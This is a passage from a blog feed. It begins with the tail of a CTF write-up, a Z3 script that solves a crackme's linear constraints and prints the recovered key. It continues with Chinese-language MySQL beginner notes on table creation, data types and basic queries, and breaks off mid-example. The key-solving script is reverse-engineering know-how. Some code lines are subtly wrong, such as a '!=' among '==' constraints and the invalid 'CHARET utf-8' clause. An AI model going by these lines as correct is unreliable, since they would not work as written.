 - <span class="number">298737</span> * v11</span><br><span class="line">        - <span class="number">26977</span> * v28</span><br><span class="line">        - <span class="number">411916</span> * v29 == -<span class="number">20388052</span>)</span><br><span class="line">v14 = v13</span><br><span class="line">v15 = a1[<span class="number">10</span>]</span><br><span class="line">v23 = v15</span><br><span class="line">s.add (<span class="number">23830</span> * v31</span><br><span class="line">        + <span class="number">389775</span> * v26</span><br><span class="line">        + <span class="number">301398</span> * v32</span><br><span class="line">        + <span class="number">367177</span> * v27</span><br><span class="line">        + <span class="number">311452</span> * v30</span><br><span class="line">        - <span class="number">434957</span> * v12</span><br><span class="line">        - <span class="number">136393</span> * v15</span><br><span class="line">        - <span class="number">172925</span> * v25</span><br><span class="line">        - <span class="number">146025</span> * v33</span><br><span class="line">        - <span class="number">493051</span> * v28</span><br><span class="line">        - <span class="number">130882</span> * v29 == -<span class="number">88920064</span>)</span><br><span class="line">v16 = a1[<span class="number">11</span>]</span><br><span class="line">v22 = v16</span><br><span class="line">s.add (-<span class="number">427662</span> * v33</span><br><span class="line">        - <span class="number">98903</span> * v29</span><br><span class="line">        - <span class="number">17320</span> * v15</span><br><span class="line">        - <span class="number">218483</span> * v32</span><br><span class="line">        - <span class="number">85741</span> * v30</span><br><span class="line">        + <span class="number">363857</span> * v26</span><br><span class="line">        + <span class="number">163521</span> * v16</span><br><span class="line">        + <span class="number">304649</span> * v27</span><br><span class="line">        + -<span class="number">43728</span> * v25</span><br><span class="line">        - <span class="number">181088</span> * v31</span><br><span class="line">        + <span class="number">173715</span> * v24</span><br><span class="line">        + <span class="number">14457</span> * v28 == -<span class="number">61620324</span>)</span><br><span class="line">v17 = a1[<span class="number">12</span>]</span><br><span class="line">v21 = v17</span><br><span class="line">s.add (-<span class="number">195542</span> * v27</span><br><span class="line">        - <span class="number">498833</span> * v32</span><br><span class="line">        - <span class="number">412336</span> * v24</span><br><span class="line">        - <span class="number">216657</span> * v29</span><br><span class="line">        - <span class="number">501433</span> * v16</span><br><span class="line">        + <span class="number">271173</span> * v31</span><br><span class="line">        + <span class="number">74652</span> * v30</span><br><span class="line">        + <span class="number">373303</span> * v28</span><br><span class="line">        - <span class="number">306925</span> * v25</span><br><span class="line">        - <span class="number">338825</span> * v26</span><br><span class="line">        - <span class="number">475559</span> * v33</span><br><span class="line">        - <span class="number">358450</span> * v17</span><br><span class="line">        - (v23 &lt;&lt; <span class="number">15</span>) == -<span class="number">174934821</span>)</span><br><span class="line">v18 = a1[<span class="number">13</span>]</span><br><span class="line">s.add (<span class="number">110210</span> * v22</span><br><span class="line">        + -<span class="number">351890</span> * v31</span><br><span class="line">        - <span class="number">184149</span> * v24</span><br><span class="line">        - <span class="number">437072</span> * v17</span><br><span class="line">        + <span class="number">324022</span> * v28</span><br><span class="line">        + <span class="number">357830</span> * v25</span><br><span class="line">        + <span class="number">162554</span> * v26</span><br><span class="line">        + <span class="number">369921</span> * v32</span><br><span class="line">        + <span class="number">142164</span> * v29</span><br><span class="line">        + <span class="number">136219</span> * v23</span><br><span class="line">        + <span class="number">49387</span> * v33</span><br><span class="line">        - <span class="number">323429</span> * v18</span><br><span class="line">        - <span class="number">198716</span> * v30</span><br><span class="line">        - <span class="number">411630</span> * v27 != -<span class="number">124829042</span>)</span><br><span class="line">v19 = a1[<span class="number">14</span>]</span><br><span class="line">s.add (<span class="number">473866</span> * v23</span><br><span class="line">        + -<span class="number">257967</span> * v32</span><br><span class="line">        - <span class="number">222834</span> * v26</span><br><span class="line">        - <span class="number">118361</span> * v25</span><br><span class="line">        + <span class="number">426304</span> * v33</span><br><span class="line">        + <span class="number">507378</span> * v19</span><br><span class="line">        + <span class="number">362998</span> * v21</span><br><span class="line">        - <span class="number">342754</span> * v27</span><br><span class="line">        - <span class="number">266674</span> * v24</span><br><span class="line">        - <span class="number">61369</span> * v18</span><br><span class="line">        - <span class="number">267106</span> * v29</span><br><span class="line">        - <span class="number">388543</span> * v22</span><br><span class="line">        - <span class="number">97045</span> * v28</span><br><span class="line">        - <span class="number">229602</span> * v31</span><br><span class="line">        - <span class="number">84816</span> * v30 == <span class="number">78977681</span>)</span><br><span class="line">s.add (<span class="number">402402</span> * v23</span><br><span class="line">        + <span class="number">477363</span> * v29</span><br><span class="line">        + <span class="number">447356</span> * v27</span><br><span class="line">        + <span class="number">46659</span> * v22</span><br><span class="line">        + -<span class="number">89442</span> * v25</span><br><span class="line">        - <span class="number">455802</span> * v28</span><br><span class="line">        - <span class="number">290697</span> * v33</span><br><span class="line">        - <span class="number">108648</span> * v18</span><br><span class="line">        + <span class="number">279039</span> * v19</span><br><span class="line">        + <span class="number">520878</span> * v24</span><br><span class="line">        + <span class="number">335538</span> * v32</span><br><span class="line">        + <span class="number">310844</span> * v31</span><br><span class="line">        + <span class="number">110817</span> * v26</span><br><span class="line">        - <span class="number">433259</span> * a1[<span class="number">15</span>]</span><br><span class="line">        - <span class="number">525875</span> * v21</span><br><span class="line">        - <span class="number">2295</span> * v30 == <span class="number">80694627</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        res += <span class="built_in">hex</span>(m[a1[i]].as_long())[<span class="number">2</span>:]</span><br><span class="line">    res = <span class="built_in">list</span>(res)</span><br><span class="line">    res.insert(<span class="number">6</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    res.insert(<span class="number">13</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    res.insert(<span class="number">20</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;un&quot;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6116fb-709467-bb13cc-52121d1111b66</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/note-language-mysql/"/>
      <url>/note-language-mysql/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>突然翻到自己上学期的MySQL的一些笔记, 故搬运</p><ul><li>好像是在哪里搬….? 如果发现请告诉我。</li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Windows10</p><p>jetbrain集成的 <strong>MariaDB</strong></p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS &lt;数据库名&gt; DEFAULT CHARET utf-8  COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure><p>创建数据库, 该命令的作用:</p><ol><li>如果数据库不存在则创建, 存在则不创建。</li><li>创建RUNOOB数据库, 并设定编码集为utf8</li></ol><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><h3 id="drop-命令"><a href="#drop-命令" class="headerlink" title="drop 命令"></a>drop 命令</h3><p>drop 命令格式:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><p>例如删除名为 RUNOOB 的数据库:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database RUNOOB;</span><br></pre></td></tr></table></figure><h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>MySQL中定义数据字段的类型对你数据库的优化是非常重要的。</p><p>MySQL支持多种类型, 大致可以分为三类:数值、日期/时间和字符串(字符)类型。</p><hr><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><p>MySQL支持所有标准SQL数值数据类型。</p><p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC), 以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。</p><p>关键字INT是INTEGER的同义词, 关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值, 并且支持MyISAM、MEMORY、InnoDB和BDB表。</p><p>作为SQL标准的扩展, MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 字节</td><td align="left">(-128, 127)</td><td align="left">(0, 255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 字节</td><td align="left">(-32 768, 32 767)</td><td align="left">(0, 65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 字节</td><td align="left">(-8 388 608, 8 388 607)</td><td align="left">(0, 16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 字节</td><td align="left">(-2 147 483 648, 2 147 483 647)</td><td align="left">(0, 4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 字节</td><td align="left">(-9, 223, 372, 036, 854, 775, 808, 9 223 372 036 854 775 807)</td><td align="left">(0, 18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 字节</td><td align="left">(-3.402 823 466 E+38, -1.175 494 351 E-38), 0, (1.175 494 351 E-38, 3.402 823 466 351 E+38)</td><td align="left">0, (1.175 494 351 E-38, 3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 字节</td><td align="left">(-1.797 693 134 862 315 7 E+308, -2.225 073 858 507 201 4 E-308), 0, (2.225 073 858 507 201 4 E-308, 1.797 693 134 862 315 7 E+308)</td><td align="left">0, (2.225 073 858 507 201 4 E-308, 1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M, D) , 如果M&gt;D, 为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><hr><h3 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h3><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p><p>每个时间类型有一个有效值范围和一个”零”值, 当指定不合法的MySQL不能表示的值时使用”零”值。</p><p>TIMESTAMP类型有专有的自动更新特性, 将在后面描述。</p><table><thead><tr><th align="left">类型</th><th align="left">大小 (字节)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01/9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’/‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901/2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">1000-01-01 00:00:00/9999-12-31 23:59:59</td><td align="left">YYYY-MM-DD HH:MM:SS</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒, 北京时间 <strong>2038-1-19 11:14:07</strong>, 格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYYMMDD HHMMSS</td><td align="left">混合日期和时间值, 时间戳</td></tr></tbody></table><hr><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255字节</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 字节</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255字节</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255字节</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535字节</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535字节</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215字节</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215字节</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295字节</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295字节</td><td align="left">极大文本数据</td></tr></tbody></table><p>CHAR 和 VARCHAR 类型类似, 但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p><p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR, 不同的是它们包含二进制字符串而不要非二进制字符串。也就是说, 它们包含字节字符串而不是字符字符串。这说明它们没有字符集, 并且排序和比较基于列值字节的数值值。</p><p>BLOB 是一个二进制大对象, 可以容纳可变数量的数据。有 4 种 BLOB 类型:TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p><p>有 4 种 TEXT 类型:TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型, 可存储的最大长度不同, 可根据实际情况选择。</p><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><p>创建MySQL数据表需要以下信息:</p><ul><li>表名</li><li>表字段名</li><li>定义每个表字段</li></ul><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>以下为创建MySQL数据表的SQL通用语法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name (column_name column_type);</span><br></pre></td></tr></table></figure><p>以下例子中我们将在 RUNOOB 数据库中创建数据表runoob_tbl:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `runoob_tbl`(</span><br><span class="line">   `runoob_id` INT UNSIGNED AUTO_INCREMENT,   `runoob_title` VARCHAR(100) NOT NULL,   `runoob_author` VARCHAR(40) NOT NULL,   `submission_date` DATE,   PRIMARY KEY ( `runoob_id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><p>实例解析:</p><ul><li>如果你不想字段为 <strong>NULL</strong> 可以设置字段的属性为 <strong>NOT NULL</strong>, 在操作数据库时如果输入该字段的数据为<strong>NULL</strong> , 就会报错。</li><li>AUTO_INCREMENT定义列为自增的属性, 一般用于主键, 数值会自动加1。</li><li>PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键, 列间以逗号分隔。</li><li>ENGINE 设置存储引擎, CHARSET 设置编码。</li></ul><h2 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h2><p>MySQL中删除数据表是非常容易操作的, 但是你再进行删除表操作时要非常小心, 因为执行删除命令后所有数据都会消失。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>以下为删除MySQL数据表的通用语法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE table_name ;</span><br></pre></td></tr></table></figure><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>MySQL 表中使用 <strong>INSERT INTO</strong> SQL语句来插入数据。</p><p>你可以通过 mysql&gt; 命令提示窗口中向数据表中插入数据, 或者通过PHP脚本来插入数据。</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p>以下为向MySQL数据表插入数据通用的 <strong>INSERT INTO</strong> SQL语法:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">INSERT INTO <span class="title">table_name</span> <span class="params">( field1, field2, ...fieldN )</span></span></span><br><span class="line"><span class="function">                       <span class="title">VALUES</span></span></span><br><span class="line"><span class="function">                       <span class="params">( value1, value2, ...valueN )</span></span>;</span><br></pre></td></tr></table></figure><p>如果数据是字符型, 必须使用单引号或者双引号, 如:”value”。</p><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>MySQL 数据库使用SQL SELECT语句来查询数据。</p><p>你可以通过 mysql&gt; 命令提示窗口中在数据库中查询数据, 或者通过PHP脚本来查询数据。</p><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p>以下为在MySQL数据库中查询数据通用的 SELECT 语法:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br><span class="line">[LIMIT N][ <span class="keyword">OFFSET</span> M]</span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表, 表之间使用逗号(, )分割, 并使用WHERE语句来设定查询条件。</li><li>SELECT 命令可以读取一条或者多条记录。</li><li>你可以使用星号（*）来代替其他字段, SELECT语句会返回表的所有字段数据</li><li>你可以使用 WHERE 语句来包含任何条件。</li><li>你可以使用 LIMIT 属性来设定返回的记录数。</li><li>你可以通过OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0。</li></ul><h2 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a>WHERE 子句</h2><p>我们知道从 MySQL 表中使用 SQL SELECT 语句来读取数据。</p><p>如需有条件地从表中选取数据, 可将 WHERE 子句添加到 SELECT 语句中。</p><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2, ...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line">[<span class="keyword">WHERE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] condition2.....</span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表, 表之间使用逗号 <strong>,</strong> 分割, 并使用WHERE语句来设定查询条件。</li><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以使用 AND 或者 OR 指定一个或多个条件。</li><li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li><li>WHERE 子句类似于程序语言中的 if 条件, 根据 MySQL 表中的字段值来读取指定的数据。</li></ul><p>以下为操作符列表, 可用于 WHERE 子句中。</p><p>下表中实例假定 A 为 10, B 为 20</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">等号, 检测两个值是否相等, 如果相等返回true</td><td align="left">(A = B) 返回false。</td></tr><tr><td align="left">&lt;&gt;, !=</td><td align="left">不等于, 检测两个值是否相等, 如果不相等返回true</td><td align="left">(A != B) 返回 true。</td></tr><tr><td align="left">&gt;</td><td align="left">大于号, 检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="left">(A &gt; B) 返回false。</td></tr><tr><td align="left">&lt;</td><td align="left">小于号, 检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="left">(A &lt; B) 返回 true。</td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于号, 检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="left">(A &gt;= B) 返回false。</td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于号, 检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="left">(A &lt;= B) 返回 true。</td></tr></tbody></table><p>如果我们想在 MySQL 数据表中读取指定的数据, WHERE 子句是非常有用的。</p><p>使用主键来作为 WHERE 子句的条件查询是非常快速的。</p><p>如果给定的条件在表中没有任何匹配的记录, 那么查询不会返回任何数据。</p><h2 id="UPDATE-更新"><a href="#UPDATE-更新" class="headerlink" title="UPDATE 更新"></a>UPDATE 更新</h2><p>如果我们需要修改或更新 MySQL 中的数据, 我们可以使用 SQL UPDATE 命令来操作。</p><h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><p>以下是 UPDATE 命令修改 MySQL 数据表数据的通用 SQL 语法:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE table_name <span class="keyword">SET</span> field1<span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span>value1, field2<span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span>value2</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure><ul><li>你可以同时更新一个或多个字段。</li><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以在一个单独表中同时更新数据。</li></ul><p>当你需要更新数据表中指定行的数据时 WHERE 子句是非常有用的。</p><h2 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h2><p>你可以使用 SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录。</p><p>你可以在 <strong>mysql&gt;</strong> 命令提示符或 PHP 脚本中执行该命令。</p><h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><p>以下是 SQL DELETE 语句从 MySQL 数据表中删除数据的通用语法:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name [<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure><ul><li>如果没有指定 WHERE 子句, MySQL 表中的所有记录将被删除。</li><li>你可以在 WHERE 子句中指定任何条件</li><li>您可以在单个表中一次性删除记录。</li></ul><p>当你想删除数据表中指定的记录时 WHERE 子句是非常有用的。</p><h2 id="LIKE-子句"><a href="#LIKE-子句" class="headerlink" title="LIKE 子句"></a>LIKE 子句</h2><p>我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据, 同时我们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</p><p>WHERE 子句中可以使用等号 <strong>=</strong> 来设定获取数据的条件, 如 “runoob_author = ‘RUNOOB.COM’”。</p><p>但是有时候我们需要获取 runoob_author 字段含有 “COM” 字符的所有记录, 这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</p><p>SQL LIKE 子句中使用百分号 **%**字符来表示任意字符, 类似于UNIX或正则表达式中的星号 *****。</p><p>如果没有使用百分号 <strong>%</strong>, LIKE 子句与等号 <strong>=</strong> 的效果是一样的。</p><h3 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h3><p>以下是 SQL SELECT 语句使用 LIKE 子句从数据表中读取数据的通用语法:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2, ...fieldN</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> field1 <span class="keyword">LIKE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] filed2 <span class="operator">=</span> <span class="string">&#x27;somevalue&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以在 WHERE 子句中使用LIKE子句。</li><li>你可以使用LIKE子句代替等号 **=**。</li><li>LIKE 通常与 <strong>%</strong> 一同使用, 类似于一个元字符的搜索。</li><li>你可以使用 AND 或者 OR 指定一个或多个条件。</li><li>你可以在 DELETE 或 UPDATE 命令中使用 WHERE…LIKE 子句来指定条件。</li></ul><h2 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h2><p>本教程为大家介绍 MySQL UNION 操作符的语法和实例。</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p><h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><p>MySQL UNION 操作符语法格式:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> expression1, expression2, ... expression_n</span><br><span class="line"><span class="keyword">FROM</span> tables</span><br><span class="line">[<span class="keyword">WHERE</span> conditions]</span><br><span class="line"><span class="keyword">UNION</span> [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span>]</span><br><span class="line"><span class="keyword">SELECT</span> expression1, expression2, ... expression_n</span><br><span class="line"><span class="keyword">FROM</span> tables</span><br><span class="line">[<span class="keyword">WHERE</span> conditions];</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li><strong>expression1, expression2, … expression_n</strong>: 要检索的列。</li><li><strong>tables:</strong> 要检索的数据表。</li><li><strong>WHERE conditions:</strong> 可选, 检索条件。</li><li><strong>DISTINCT:</strong> 可选, 删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据, 所以 DISTINCT 修饰符对结果没啥影响。</li><li><strong>ALL:</strong> 可选, 返回所有结果集, 包含重复数据。</li></ul><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>我们知道从 MySQL 表中使用 SQL SELECT 语句来读取数据。</p><p>如果我们需要对读取的数据进行排序, 我们就可以使用 MySQL 的 <strong>ORDER BY</strong> 子句来设定你想按哪个字段哪种方式来进行排序, 再返回搜索结果。</p><h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><p>以下是 SQL SELECT 语句使用 ORDER BY 子句将查询数据排序后再返回数据:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2, ...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> field1 [<span class="keyword">ASC</span> [<span class="keyword">DESC</span>][默认 <span class="keyword">ASC</span>]], [field2...] [<span class="keyword">ASC</span> [<span class="keyword">DESC</span>][默认 <span class="keyword">ASC</span>]]</span><br></pre></td></tr></table></figure><ul><li>你可以使用任何字段来作为排序的条件, 从而返回排序后的查询结果。</li><li>你可以设定多个字段来排序。</li><li>你可以使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列。 默认情况下, 它是按升序排列。</li><li>你可以添加 WHERE…LIKE 子句来设置条件。</li></ul><h2 id="GROUP-BY-语句"><a href="#GROUP-BY-语句" class="headerlink" title="GROUP BY 语句"></a>GROUP BY 语句</h2><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p><p>在分组的列上我们可以使用 COUNT, SUM, AVG, 等函数。</p><h3 id="GROUP-BY-语法"><a href="#GROUP-BY-语法" class="headerlink" title="GROUP BY 语法"></a>GROUP BY 语法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, <span class="keyword">function</span>(column_name)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name operator <span class="keyword">value</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column_name;</span><br></pre></td></tr></table></figure><hr><h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><p>本章节实例使用到了以下表结构及数据, 使用前我们可以先将以下数据导入数据库中。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> NAMES utf8;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">--  Table structure for `employee_tbl`</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `employee_tbl`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `employee_tbl` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> 